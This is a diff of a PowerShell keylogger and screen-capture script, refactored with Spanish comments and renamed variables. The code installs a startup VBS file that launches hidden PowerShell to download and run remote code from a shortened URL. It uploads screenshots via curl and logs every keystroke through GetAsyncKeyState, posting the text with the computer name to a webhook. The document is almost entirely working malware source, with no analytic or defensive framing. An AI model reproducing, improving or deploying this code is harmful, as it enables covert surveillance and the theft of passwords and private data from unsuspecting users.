@@ -1,28 +1,19 @@
 # shortened URL Detection
-
-if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}
-
-$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\init.txt"
-$mkFile = "Set WshShell = WScript.CreateObject(`"WScript.Shell`")"
-$mkFile | Out-File -FilePath $pth -Force
-$mkFile = "WshShell.Run `"powershell.exe -NoP -Ep Bypass -W H -C `$dc=`"$dc`"; irm https://is.gd/bw_kl_to_dc | iex`", 0, True"
-$mkFile | Out-File -FilePath $pth -Append -Force
-Rename-Item -Path $pth -NewName "init.vbs" -Force
-
-$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-$hwnd = (Get-Process -PID $pid).MainWindowHandle
-if($hwnd -ne [System.IntPtr]::Zero){
-    $Type::ShowWindowAsync($hwnd, 0)
+if ($dc.Length -ne 121) {
+    Write-Host "Shortened Webhook URL Detected.."
+    $dc = (irm $dc).url
 }
-else{
-    $Host.UI.RawUI.WindowTitle = 'hideme'
-    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-    $hwnd = $Proc.MainWindowHandle
-    $Type::ShowWindowAsync($hwnd, 0)
-}
-# Import DLL Definitions for keyboard inputs
-$API = @'
+
+# Crear el archivo de inicio
+$startupFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\init.txt"
+$wshShellCreation = "Set WshShell = WScript.CreateObject(`"WScript.Shell`")"
+$wshShellCreation | Out-File -FilePath $startupFilePath -Force
+$wshShellRun = "WshShell.Run `"powershell.exe -NoP -Ep Bypass -W H -C `$dc=`"$dc`"; irm https://is.gd/bw_kl_to_dc | iex`", 0, True"
+$wshShellRun | Out-File -FilePath $startupFilePath -Append -Force
+Rename-Item -Path $startupFilePath -NewName "init.vbs" -Force
+
+# Importar las definiciones DLL para las entradas de teclado
+$keyboardAPI = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -32,109 +23,113 @@ public static extern int MapVirtualKey(uint uCode, int uMapType);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
-$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
+
+# Añadir el tipo Win32 al espacio de nombres API
+$keyboardAPI = Add-Type -MemberDefinition $keyboardAPI -Name 'Win32' -Namespace API -PassThru
+
+# Intervalo entre capturas de pantalla en segundos
 $seconds = 30
 # Cantidad de capturas de pantalla a tomar
 $a = 1
 
-}
-
-While ($a -gt 0){
+# Bucle principal para capturar pantallas
+While ($a -gt 0) {
     # Ruta del archivo temporal para la captura de pantalla
-    $Filett = "$env:temp\SC.png"
+    $screenshotPath = "$env:temp\SC.png"
 
-    # Importa las bibliotecas necesarias
+    # Importar las bibliotecas necesarias
     Add-Type -AssemblyName System.Windows.Forms
     Add-type -AssemblyName System.Drawing
 
-    # Obtiene información sobre la pantalla virtual
-    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $Width = $Screen.Width
-    $Height = $Screen.Height
-    $Left = $Screen.Left
-    $Top = $Screen.Top
+    # Obtener información sobre la pantalla virtual
+    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $width = $screen.Width
+    $height = $screen.Height
+    $left = $screen.Left
+    $top = $screen.Top
 
-    # Crea un objeto Bitmap y realiza la captura de pantalla
-    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    # Crear un objeto Bitmap y realizar la captura de pantalla
+    $bitmap = New-Object System.Drawing.Bitmap $width, $height
     $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
 
-    # Guarda la captura de pantalla en un archivo
-    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    # Guardar la captura de pantalla en un archivo
+    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::png)
 
-    # Espera 1 segundo antes de continuar
+    # Esperar 1 segundo antes de continuar
     Start-Sleep 1
 
-    # Usa cURL para enviar la captura de pantalla al webhook
-    curl.exe -F "file1=@$filett" $hookurl
+    # Usar cURL para enviar la captura de pantalla al webhook
+    curl.exe -F "file1=@$screenshotPath" $dc
 
-    # Espera 1 segundo antes de continuar
+    # Esperar 1 segundo antes de continuar
     Start-Sleep 1
 
-    # Elimina el archivo de la captura de pantalla
-    Remove-Item -Path $filett
+    # Eliminar el archivo de la captura de pantalla
+    Remove-Item -Path $screenshotPath
 
-    # Espera el tiempo especificado antes de la siguiente captura
+    # Esperar el tiempo especificado antes de la siguiente captura
     Start-Sleep $seconds
 
-    # Decrementa el contador
+    # Decrementar el contador
     $a--
-    }
-# Add stopwatch for intellegent sending
-$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
-$KeypressThreshold = [TimeSpan]::FromSeconds(10)
+}
 
-# Start a continuous loop
-While ($true){
-  $keyPressed = $false
-    try{
-      # Start a loop that checks the time since last activity before message is sent
-      while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
-      # Start the loop with 30 ms delay between keystate check
-      Start-Sleep -Milliseconds 30
-        for ($asc = 8; $asc -le 254; $asc++){
-        # Get the key state. (is any key currently pressed)
-        $keyst = $API::GetAsyncKeyState($asc)
-          # If a key is pressed
-          if ($keyst -eq -32767) {
-          # Restart the inactivity timer
-          $keyPressed = $true
-          $LastKeypressTime.Restart()
-          $null = [console]::CapsLock
-          # Translate the keycode to a letter
-          $vtkey = $API::MapVirtualKey($asc, 3)
-          # Get the keyboard state and create stringbuilder
-          $kbst = New-Object Byte[] 256
-          $checkkbst = $API::GetKeyboardState($kbst)
-          $logchar = New-Object -TypeName System.Text.StringBuilder
-            # Define the key that was pressed          
-            if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
-              # Check for non-character keys
-              $LString = $logchar.ToString()
-                if ($asc -eq 8) {$LString = "[BKSP]"}
-                if ($asc -eq 13) {$LString = "[ENT]"}
-                if ($asc -eq 27) {$LString = "[ESC]"}
-            # Add the key to sending variable
-            $send += $LString 
+# Añadir stopwatch para el envío inteligente
+$lastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
+$keypressThreshold = [TimeSpan]::FromSeconds(10)
+
+# Bucle continuo
+While ($true) {
+    $keyPressed = $false
+    try {
+        # Bucle que verifica el tiempo desde la última actividad antes de enviar el mensaje
+        while ($lastKeypressTime.Elapsed -lt $keypressThreshold) {
+            # Iniciar el bucle con una demora de 30 ms entre las comprobaciones del estado de las teclas
+            Start-Sleep -Milliseconds 30
+            for ($asc = 8; $asc -le 254; $asc++) {
+                # Obtener el estado de la tecla (¿se presionó alguna tecla?)
+                $keyst = $keyboardAPI::GetAsyncKeyState($asc)
+                # Si se presionó una tecla
+                if ($keyst -eq -32767) {
+                    # Reiniciar el temporizador de inactividad
+                    $keyPressed = $true
+                    $lastKeypressTime.Restart()
+                    $null = [console]::CapsLock
+                    # Traducir el código de tecla a una letra
+                    $vtkey = $keyboardAPI::MapVirtualKey($asc, 3)
+                    # Obtener el estado del teclado y crear un StringBuilder
+                    $kbst = New-Object Byte[] 256
+                    $checkkbst = $keyboardAPI::GetKeyboardState($kbst)
+                    $logchar = New-Object -TypeName System.Text.StringBuilder
+                    # Definir la tecla que se presionó
+                    if ($keyboardAPI::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
+                        # Comprobar teclas no alfabéticas
+                        $LString = $logchar.ToString()
+                        if ($asc -eq 8) {$LString = "[BKSP]"}
+                        if ($asc -eq 13) {$LString = "[ENT]"}
+                        if ($asc -eq 27) {$LString = "[ESC]"}
+                        # Añadir la tecla a la variable de envío
+                        $send += $LString 
+                    }
+                }
             }
-          }
         }
-      }
     }
-    finally{
-      If ($keyPressed) {
-      # Send the saved keys to a webhook
-      $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
-      $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
-      $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
-      Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
-      #Remove log file and reset inactivity check 
-      $send = ""
-      $keyPressed = $false
-      }
+    finally {
+        If ($keyPressed) {
+            # Enviar las teclas guardadas a un webhook
+            $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
+            $escmsg = $timestamp + " : " + '`' + $escmsgsys + '`'
+            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
+            Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
+            # Eliminar el archivo de registro y restablecer la verificación de inactividad
+            $send = ""
+            $keyPressed = $false
+        }
     }
-  # reset stopwatch before restarting the loop
-  $LastKeypressTime.Restart()
-  Start-Sleep -Milliseconds 10
+    # Restablecer el cronómetro antes de reiniciar el bucle
+    $lastKeypressTime.Restart()
+    Start-Sleep -Milliseconds 10
 }
